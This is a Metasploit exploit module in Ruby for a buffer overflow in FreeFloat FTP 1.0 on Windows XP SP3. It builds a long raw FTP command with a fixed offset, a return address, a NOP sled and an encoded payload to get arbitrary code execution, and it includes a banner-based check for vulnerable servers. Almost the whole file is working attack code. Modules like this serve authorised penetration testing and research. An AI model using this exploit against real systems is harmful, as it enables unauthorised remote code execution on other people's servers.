##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  #Rank definition: http://dev.metasploit.com/redmine/projects/framework/wiki/Exploit_Ranking
  #ManualRanking/LowRanking/AverageRanking/NormalRanking/GoodRanking/GreatRanking/ExcellentRanking
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  

  def initialize(info = {})
    super(update_info(info,
      'Name'    => 'FreeFloat FTP 1.0 RAW Command',
      'Description'  => %q{
          FreeFloat FTP 1.0 allows an attacker to trigger a buffer overflow and 
          execute arbitrary code when a long and invalid raw command is sent to it.
      },
      'License'    => MSF_LICENSE,
      'Author'    =>
        [
          'superkojiman',  # Original discovery
          'l4mers3c',  # MSF Module
        ],
      'References'  =>
        [
         # [ 'OSVDB', '<insert OSVDB number here>' ],
         # [ 'CVE', 'insert CVE number here' ],
          [ 'URL', 'http://secpod.org/blog/?m=201108' ]
        ],
      'DefaultOptions' =>
        {
          'ExitFunction' => 'seh', #none/process/thread/seh
          #'InitialAutoRunScript' => 'migrate -f',
        },
      'Platform'  => 'win',
      'Payload'  =>
        {
          'BadChars' => "\x00\x0a\x0b\x27\x36\xce\xc1\x04\x14\x3a\x44\xe0\x42\xa9\x0d", # <change if needed>
          'DisableNops' => true,
        },

      'Targets'    =>
        [
          [ 'XP SP3',
            {
              'Ret'     =>  0x7cb32d69,
              'Offset'  =>  251
            }
          ],
        ],
      'Privileged'  => false,
      #Correct Date Format: "M D Y"
      #Month format: Jan,Feb,Mar,Apr,May,Jun,Jul,Aug,Sep,Oct,Nov,Dec
      'DisclosureDate'  => ' FEB 10 2013',
      'DefaultTarget'  => 0))

    register_options([Opt::RPORT(21)], self.class)

  end
def check
    connect
    disconnect
    if (banner =~ /FreeFloat/)
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    connect
    buf = rand_text(target['Offset'])
    buf << [ target['Ret'] ].pack('V')
    buf << make_nops(129)
    buf << payload.encoded
    sock.put(buf + "\r\n")
    print_status("Trying target #{target.name}...")
    disconnect
  end
end
